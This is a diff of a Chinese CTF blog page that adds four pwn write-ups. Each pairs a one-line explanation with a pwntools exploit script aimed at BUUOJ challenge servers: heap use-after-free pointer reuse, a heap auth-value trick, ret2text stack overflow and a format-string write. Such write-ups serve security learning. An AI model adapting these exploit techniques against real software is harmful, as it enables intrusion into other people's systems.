@@ -381,14 +381,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    16k
+                    16.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    86 分
+                    88 分
                 </div>
                 
 
@@ -3364,6 +3364,137 @@ Wrong flag<span class="token punctuation">..</span>.<span aria-hidden="true" cla
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CTFMan@out:~$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaa134520960
 flag<span class="token punctuation">&#123;</span>2a8640a2-f9dc-438c-b5ea-31dd2bc13f1f<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
+<h2 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h2><p>很经典的堆题，show 功能利用的是堆中的指针，通过构造不同大小的堆复用指针覆盖成后门即可</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27369</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Her name size is'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Her name is'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+bd <span class="token operator">=</span> <span class="token number">0x400B9C</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="picoctf-2018-are"><a href="#picoctf-2018-are" class="headerlink" title="picoctf_2018_are"></a>picoctf_2018_are</h2><p>堆管理的 fd 位置存放堆内容的指针，bk 位置存放 auth 值，要求auth &#x3D; 5，但又不能直接输入 5，在堆内容的堆 bk 位置存放 5，释放后让堆管理落在这个位置复用这个 5</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25712</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+bd <span class="token operator">=</span> <span class="token number">0x4009B6</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'login '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'reset'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'login '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">'get-flag'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="SUCTF-2018-stack"><a href="#SUCTF-2018-stack" class="headerlink" title="SUCTF_2018_stack"></a>SUCTF_2018_stack</h2><p>ret2text</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28032</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40067A</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'========='</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h2><p>堆上的格式化字符串，只能用一次，直接爆破栈地址地位</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28340</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+bd <span class="token operator">=</span> <span class="token number">0x80485AB</span>
+
+p1 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6c</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hhn'</span>
+p2 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x85AB</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hn'</span>
+p <span class="token operator">=</span> p1 <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> p2 
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'...'</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -3656,7 +3787,7 @@ flag<span class="token punctuation">&#123;</span>2a8640a2-f9dc-438c-b5ea-31dd2bc
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">208k</span>&nbsp;字
             
             
             
